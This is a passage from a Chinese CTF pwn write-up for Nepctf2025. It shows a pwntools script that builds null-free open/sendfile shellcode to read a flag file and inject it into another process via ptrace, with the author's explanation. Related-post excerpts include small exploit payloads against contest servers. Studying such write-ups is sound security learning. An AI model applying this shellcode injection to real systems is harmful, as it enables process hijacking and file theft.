+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">movabs rax,  0x101010101010101</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">movabs rax, 0x10166606d672e2f</span></span><br><span class="line"><span class="string">xor QWORD PTR [rsp], rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">push 0x2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov r10d, 0x1010201</span></span><br><span class="line"><span class="string">xor r10d, 0x1010301</span></span><br><span class="line"><span class="string">push 0x1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">push 0x3</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x28</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">add = <span class="number">0xDEADC0DE000</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(code) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">    padding = <span class="number">8</span> - (<span class="built_in">len</span>(code) % <span class="number">8</span>)</span><br><span class="line">    code += <span class="string">b&#x27;\x90&#x27;</span> * padding</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(code),<span class="number">8</span>):</span><br><span class="line">    chunk = code[i:i+<span class="number">8</span>]</span><br><span class="line">    data = u64(chunk)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;shellcode+=asm(shellcraft.ptrace(5, &#x27;r14&#x27;, <span class="subst">&#123;<span class="built_in">hex</span>(add)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(data)&#125;</span>))&quot;</span>)</span><br><span class="line">    add += <span class="number">8</span></span><br></pre></td></tr></table></figure>
+
+<p>由于直接由板子构造的shellcode可能会出现<code>\x00</code>的字节，导致截断，所以这里用了一些技巧。</p>
+<p>可以看出来，我们把rax和rsp进行异或操作，并且把结果存在rsp中。可以看到是<code>0x101010101010101</code> <code>xor</code> <code>0x10166606d672e2f </code>结果是<code>0x000067616c662f2e</code>，小端序换成ASCII值后正好就是<code>./flag\0\0</code>。然后是去syscall open函数。</p>
+<p>然后这里也不是正常的orw，而是用了sendfile去替换了read和write函数。</p>
+<p>那我们要先看一下sendfile函数的签名。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendfile</span><span class="params">(<span class="type">int</span> out_fd, <span class="type">int</span> in_fd, <span class="type">off_t</span> *offset, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里有四个参数：</p>
+<p>一参为目标文件描述符(一般设置为1,标准输出)</p>
+<p>二参为源文件描述符(一般为3,flag文件)</p>
+<p>三参为0(从flag文件的头开始读取)</p>
+<p>四参为读取的长度</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/03/26/Nepctf2025/">http://example.com/2026/03/26/Nepctf2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/26/C++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/" title="C++异常处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-26</div><div class="info-item-2">C++异常处理</div></div><div class="info-2"><div class="info-item-1">C++异常处理机制misc | Hexo C++ 异常处理是一种在程序运行时处理错误和特殊情况的机制。它允许程序在遇到问题时，通过抛出和捕获异常来转移控制流，而不是使用传统的错误处理方法（如通过函数返回值）。C++ 异常处理主要涉及三个关键字：try、catch和throw。 核心工作机制：栈展开 (Stack Unwinding)这是C++异常机制中最重要的一环。当异常被 throw 抛出，且在当前作用域没有找到匹配的 catch 块时，C++ 运行时会去调用者的作用域中寻找，一直沿着函数调用栈向上找。 在这个“向上找”的过程中，C++ 会自动调用当前作用域内所有已构造的局部对象的析构函数，安全地释放资源。这个过程就叫栈展开。这与 RAII（资源获取即初始化）机制完美配合，防止了内存泄漏。 异常展开机制在把控制权交还给 main 函数时，不仅会设置 RIP，还会从栈上恢复 RBP 寄存器，以恢复 main 函数的栈帧环境。 所以说，如果我们能伪造rbp+8的地址，让它指向一个含有c++异常处理的函数。这样做到可以绕过canary等保护。 [第五空间 2022]toolkit链接...</div></div></div></a><a class="pagination-related" href="/2026/02/07/Hgame2026/" title="Hgame2026"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-07</div><div class="info-item-2">Hgame2026</div></div><div class="info-2"><div class="info-item-1">Hgame 2026第一周的Hgame pwn的部分题解。花了一周的大部分时间在写。也确实难度很高。万幸的是还好没爆零。还是需要不断学习的。 1.EZheap真的ez吗？😂快被虐哭了😢其实是自己菜。 123456789101112131415161718192021222324252627282930313233343536int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int choice; // [rsp+4h] [rbp-34h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-30h]  v5 = __readfsqword(0x28u);  init();  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;choice);    switch ( choice )    &#123;      case 1:        add()...</div></div></div></a><a class="pagination-related" href="/2025/12/11/ISCTF/" title="ISCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-11</div><div class="info-item-2">ISCTF</div></div><div class="info-2"><div class="info-item-1">ISCTF1.Sign 看ida里，可以看出buf是一维数组。类型为dword，4字节。所以索引值为27的 时候，实际上是第28个元素。所以我们只需要控制覆盖buf的第28个元素为-1378178390就可以getshell了。那么padding就是27*4&#x3D;108。由于这里是有符号数转16进制，所以上网站转换一下就行。  目标数的16进制是0xaddaaaaa。同时由于这里是dword，4字节，所以用p32包裹0xaddaaaaa就可以getshell了。 下面给出exp。 12345678from pwn import *io = remote(&#x27;challenge.bluesharkinfo.com&#x27;,25138)pl = b&#x27;a&#x27; * 108 + p32(0xaddaaaaa)io.sendafter(b&#x27;do you like blueshark?&#x27;,pl)io.interactive()  2.Fmt 经典的格式化字符串泄露。但是这里需要换一下附件的依赖。 由于这里给了libc.so.6，所以我们可...</div></div></div></a><a class="pagination-related" href="/2026/03/16/Magic-gadget/" title="Magic_gadget"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-16</div><div class="info-item-2">Magic_gadget</div></div><div class="info-2"><div class="info-item-1">Magic_gadget经过我师傅的一阵敲打，发现自己还是不能放松下来，还是有很多不足的。所以后续一段时间的文章，都是摘自我师傅博客后自己的理解。 这篇文章的原链接是：Magic_gadget | Hexo 1._do_global_dtors_aux函数常见于编译后的二进制文件（尤其是 C&#x2F;C++ 程序），它与全局对象析构和程序终止时的清理逻辑相关。说明是这个函数普遍存在于二进制文件中。2._libc_csu_init 作为初始化函数,普遍存在于二进制文件中。 所以本文的手法，就是基于通过上面两个函数的结合来达到的。 我们现在看一下_do_global_dtors_aux函数在ida里的具体体现。 12345678910.text:00000000004011C0 __do_global_dtors_aux proc near         ; DATA XREF: .fini_array:__do_global_dtors_aux_fini_array_entry↓o.text:00000000004011C0                 endbr64.te...</div></div></div></a><a class="pagination-related" href="/2026/04/06/NCTF2026/" title="NCTF2026"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-06</div><div class="info-item-2">NCTF2026</div></div><div class="info-2"><div class="info-item-1">NCTF2026 从一开始对NCTF满怀憧憬，到最后打完比赛颇感无语，我只能说比赛是好的，出题的师傅们是好的，做题的我们不好。并不排斥利用ai，但是过度利用ai仅仅只为了让自己的排名上升一点，看上去舒服一点，ai全程托管，py行为，各种手段层出不穷，无所不用其极，需要我好好思考后面应该怎么走。 言归正传 ，这里NCTF pwn方向有四道题，最后一道压轴的iot类型和一道高版本的large bin attack的heap题没写出来。下面给出前面两道的打法。 1.Checkin12345678910int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  puts(&quot;Please checkin first&quot;);  read(0, buf, 0x100uLL); ...</div></div></div></a><a class="pagination-related" href="/2026/01/20/RDCTF/" title="RDCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-20</div><div class="info-item-2">RDCTF</div></div><div class="info-2"><div class="info-item-1">RDCTF1.Ret2text简单的pwn的入门题。 func函数里有read函数的栈溢出，溢出字节大小为0x20。 1234567int func()&#123;  _BYTE buf[48]; // [rsp+0h] [rbp-30h] BYREF  read(0, buf, 0x50uLL);  return puts(&quot;you may be forgot something~&quot;);&#125;  同时观察里面有backdoor函数，那么直接劫持执行流到后门函数就好。 下面给出exp。 1234567891011from pwn import *context.log_level = &#x27;debug&#x27;io = remote(&#x27;121.29.138.132&#x27;,30120)#io = process(&#x27;./pwn&#x27;)backdoor = 0x401269io.recvuntil(b&#x27;input:&#x27;)pl = b&#x27;a&#x27;*0x38 + p64(backdoor)io...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/06/NCTF2026/" title="NCTF2026">NCTF2026</a><time datetime="2026-04-06T12:59:23.000Z" title="发表于 2026-04-06 20:59:23">2026-04-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/26/Nepctf2025/" title="Nepctf2025">Nepctf2025</a><time datetime="2026-03-26T13:10:11.000Z" title="发表于 2026-03-26 21:10:11">2026-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/26/C++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/" title="C++异常处理">C++异常处理</a><time datetime="2026-03-26T09:59:03.000Z" title="发表于 2026-03-26 17:59:03">2026-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/16/Magic-gadget/" title="Magic_gadget">Magic_gadget</a><time datetime="2026-03-16T14:02:29.000Z" title="发表于 2026-03-16 22:02:29">2026-03-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/10/House-of-force/" title="House_of_force">House_of_force</a><time datetime="2026-03-10T09:32:20.000Z" title="发表于 2026-03-10 17:32:20">2026-03-10</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">8</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">11</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.5em; color: #99a9bf">pwn入门</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.23em; color: #999ea6">pwn进阶</a> <a href="/tags/pwn/" style="font-size: 1.37em; color: #99a4b2">pwn</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">6</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">25</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-04-06T14:44:46.902Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
